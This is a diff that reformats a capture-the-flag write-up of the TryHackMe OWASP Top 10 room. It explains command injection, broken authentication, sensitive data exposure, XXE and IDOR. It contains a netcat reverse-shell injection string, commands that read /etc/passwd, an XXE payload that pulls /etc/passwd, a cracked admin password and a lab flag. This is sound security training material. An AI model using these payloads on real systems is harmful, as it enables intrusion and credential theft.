@@ -4,9 +4,11 @@ description: 'https://tryhackme.com/room/owasptop10'
 
 # \[Writeup\] Try Hack Me – OWASP Top 10 Challenge for 10 Days
 
-**Day 1 – OS Command Injection**
+## **Day 1 – OS Command Injection**
 
-Command Injection occurs when server-side code \(like PHP\) in a web application makes a system call on the hosting machine. It is a web vulnerability that allows an attacker to take advantage of that made system call to execute operating system commands on the server. Sometimes this won't always end in something malicious, like a _whoami_ or just reading of files. That isn't too bad. But the thing about command injection is it opens up many options for the attacker. The worst thing they could do would be to spawn a reverse shell to become the user that the webserver is running as. A simple _;nc -e /bin/bash_ is all that's needed and they own your server. some variants of _netcat_ don't support the -e option. You can use a list of these reverse shells as an alternative.
+Command Injection occurs when server-side code \(like PHP\) in a web application makes a system call on the hosting machine. It is a web vulnerability that allows an attacker to take advantage of that made system call to execute operating system commands on the server. Sometimes this won't always end in something malicious, like a _whoami_ or just reading of files. That isn't too bad. But the thing about command injection is it opens up many options for the attacker. The worst thing they could do would be to spawn a reverse shell to become the user that the webserver is running as. 
+
+A simple `;nc -e /bin/bash` is all that's needed and they own your server. some variants of `netcat` don't support the -e option. You can use a list of these reverse shells as an alternative.
 
 Once the attacker has a foothold on the web server, they can start the usual enumeration of your systems and start looking for ways to pivot around. Now that we know what command injection is, we'll start going into the different types and how to test for them.
 
@@ -16,11 +18,11 @@ Blind command injection occurs when the system command made to the server does n
 
 _**\#1. What strange text file is in the website root directory?**_
 
-Using “ls -l” command I can see all of the file in root directory. Then, I’ve got a file name “drpepper.txt”.
+Using the`ls -l` command I can see all of the files in root directory. Then, I’ve got a file name `drpepper.txt`.
 
 _**\#2. How many non-root/non-service/non-daemon users are there?**_
 
-In this, I’ve used this command: “compgen -u \| wc -l”.
+In this, I’ve used this command: `compgen -u | wc -l`.
 
 * compgen is bash built-in command and it will show all available commands, aliases, and functions for you
 * -u: means names of userAlias names
@@ -29,23 +31,25 @@ In this, I’ve used this command: “compgen -u \| wc -l”.
 
 _**\#3. What user is this app running as?**_
 
-Using “id” command then I’ve got “www-data”
+Using `id` command then I’ve got `www-data`
 
 _**\#4. What is the user's shell set as?**_
 
-I’ve tried to this command “less /etc/passwd” to show all of the users in the system, then I got users’ shell set as “/usr/sbin/nologin”.
+I’ve tried to this command `less /etc/passwd` to show all of the users in the system, then I got users’ shell set as `/usr/sbin/nologin`.
 
 _**\#5. What version of Ubuntu is running?**_
 
-Using “lsb\_release -a” command to show some information about the system then I’ve got “Distributor ID: Ubuntu Description: Ubuntu 18.04.4 LTS Release: 18.04 Codename: bionic”.
+Using the `lsb_release -a` command to show some information about the system then I’ve got “Distributor ID: Ubuntu Description: Ubuntu 18.04.4 LTS Release: 18.04 Codename: bionic”.
 
 _**\#6. Print out the MOTD. What favorite beverage is shown?**_
 
-motd also is known as "Message Of The Day" daemon. The motd message can be customized to fit the individual needs of each user or administrator by modifying the /etc/motd file or script within the /etc/update-motd.d directory.
+motd also is known as "Message Of The Day" daemon. The motd message can be customized to fit the individual needs of each user or administrator by modifying the `/etc/motd` file or script within the `/etc/update-motd.d`directory.
 
-I’ve tried “ls /etc/update-motd.d/” then I got “00-header 10-help-text 50-landscape-sysinfo 50-motd-news 80-esm 80-livepatch 90-updates-available 91-release-upgrade 92-unattended-upgrades 95-hwe-eol 97-overlayroot 98-fsck-at-reboot 98-reboot-required”. Then, I’ve used this “cat /etc/update-motd.d/00-header” to show all of information in “00-header”, so I got it “\#!/bin/sh \# \# 00-header - create the header of the MOTD \# Copyright \(C\) 2009-2010 Canonical Ltd. \# \# Authors: Dustin Kirkland \# \# This program is free software; you can redistribute it and/or modify \# it under the terms of the GNU General Public License as published by \# the Free Software Foundation; either version 2 of the License, or \# \(at your option\) any later version. \# \# This program is distributed in the hope that it will be useful, \# but WITHOUT ANY WARRANTY; without even the implied warranty of \# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the \# GNU General Public License for more details. \# \# You should have received a copy of the GNU General Public License along \# with this program; if not, write to the Free Software Foundation, Inc., \# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA. \[ -r /etc/lsb-release \] && . /etc/lsb-release if \[ -z "$DISTRIB\_DESCRIPTION" \] && \[ -x /usr/bin/lsb\_release \]; then \# Fall back to using the very slow lsb\_release utility DISTRIB\_DESCRIPTION=$\(lsb\_release -s -d\) fi printf "Welcome to %s \(%s %s %s\)\n" "$DISTRIB\_DESCRIPTION" "$\(uname -o\)" "$\(uname -r\)" "$\(uname -m\)" **DR PEPPER** MAKES THE WORLD TASTE BETTER!”
+I’ve tried `ls /etc/update-motd.d/` then I got `00-header 10-help-text 50-landscape-sysinfo 50-motd-news 80-esm 80-livepatch 90-updates-available 91-release-upgrade 92-unattended-upgrades 95-hwe-eol 97-overlayroot 98-fsck-at-reboot 98-reboot-required`
 
-**Day 2 – Broken Authentication**
+Then, I’ve used `cat /etc/update-motd.d/00-header` to show all of the information in `00-header`, so I got it `#!/bin/sh # # 00-header - create the header of the MOTD # Copyright (C) 2009-2010 Canonical Ltd. # # Authors: Dustin Kirkland # # This program is free software; you can redistribute it and/or modify # it under the terms of the GNU General Public License as published by # the Free Software Foundation; either version 2 of the License, or # (at your option) any later version. # # This program is distributed in the hope that it will be useful, # but WITHOUT ANY WARRANTY; without even the implied warranty of # MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the # GNU General Public License for more details. # # You should have received a copy of the GNU General Public License along # with this program; if not, write to the Free Software Foundation, Inc., # 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA. [ -r /etc/lsb-release ] && . /etc/lsb-release if [ -z "$DISTRIB_DESCRIPTION" ] && [ -x /usr/bin/lsb_release ]; then # Fall back to using the very slow lsb_release utility DISTRIB_DESCRIPTION=$(lsb_release -s -d) fi printf "Welcome to %s (%s %s %s)\n" "$DISTRIB_DESCRIPTION" "$(uname -o)" "$(uname -r)" "$(uname -m)"` **`DR PEPPER`** `MAKES THE WORLD TASTE BETTER!`
+
+## **Day 2 – Broken Authentication**
 
 Authentication and session management constitute the core components of modern web applications. Authentication allows users to gain access to web applications by verifying their identities. The most common form of authentication is using a username and password mechanism. A user would enter these credentials, the server would verify them. If they are correct, the server would then provide the users’ browser with a session cookie. A session cookie is needed because web servers use HTTP\(S\) to communicate which is stateless. Attaching session cookies means that the server will know who is sending what data. The server can then keep track of the users' actions.
 
@@ -59,13 +63,13 @@ There can be various mitigation for broken authentication mechanisms depending o
 * To avoid brute force attacks, ensure that the application enforces an automatic lockout after a certain number of attempts. This would prevent an attacker from launching more brute force attacks.
 * Implement Multi-Factor Authentication - If a user has multiple methods of authentication, for example, using username and passwords and receiving a code on their mobile device, then it would be difficult for an attacker to get access to both credentials to get access to their account.
 
-**Day 3 – Sensitive Data Exposure**
+## **Day 3 – Sensitive Data Exposure**
 
 When a web app accidentally divulges sensitive data, we refer to it as "Sensitive Data Exposure". This is often data directly linked to customers \(e.g. names, dates-of-birth, financial information, etc\), but could also be more technical information, such as usernames and passwords. At more complex levels this often involves techniques such as a "Man in The Middle Attack", whereby the attacker would force user connections through a device which they control, then take advantage of weak encryption on any transmitted data to gain access to the intercepted information \(if the data is even encrypted in the first place...\). Of course, many examples are much simpler, and vulnerabilities can be found in web apps which can be exploited without any advanced networking knowledge. Indeed, in some cases, sensitive data can be found directly on the webserver itself...
 
 \#_**1. Have a look around the web app. The developer has left themselves a note indicating that there is sensitive data in a specific directory. What is the name of the mentioned directory?**_
 
-Open source code then I’ve got “&lt;!-- Must remember to do something better with the database than store it in /assets... --&gt;”.
+Open source code then I’ve got `<!-- Must remember to do something better with the database than store it in /assets... -->`
 
 _**\#2. Navigate to the directory you found in question one. What file stands out as being likely to contain sensitive data?**_
 
@@ -83,13 +87,13 @@ I downloaded that file then using the “sqlite3” tool to open the file follow
 
 _**\#4. Crack the hash. What is the admin's plaintext password?**_
 
-Then, using [https://crackstation.net/](https://crackstation.net/) tool to crack the hash password. =&gt; qwertyuiop
+Then, using [https://crackstation.net/](https://crackstation.net/) tool to crack the hash password. =&gt; `qwertyuiop`
 
 _**\#5. Log in as the admin. What is the flag?**_
 
-Finally, I got the flag “THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}”
+Finally, I got the flag `THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}`
 
-**Day 4 – XML External Entity**
+## **Day 4 – XML External Entity**
 
 ![](.gitbook/assets/0.png)
 
@@ -126,13 +130,9 @@ DTD stands for Document Type Definition. A DTD defines the structure and the leg
 
 **Payload:**
 
-&lt;?xml version="1.0"?&gt;
+`<?xml version="1.0"?><!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]><root>&read;</root>`
 
-&lt;!DOCTYPE root \[&lt;!ENTITY read SYSTEM 'file:///etc/passwd'&gt;\]&gt;
-
-&lt;root&gt;&read;&lt;/root&gt;
-
-**Day 4 – Broken Access Control**
+## **Day 5 – Broken Access Control**
 
 IDOR, or Insecure Direct Object Reference, is the act of exploiting a misconfiguration in the way user input is handled, to access resources you wouldn't ordinarily be able to access. IDOR is a type of access control vulnerability.
 
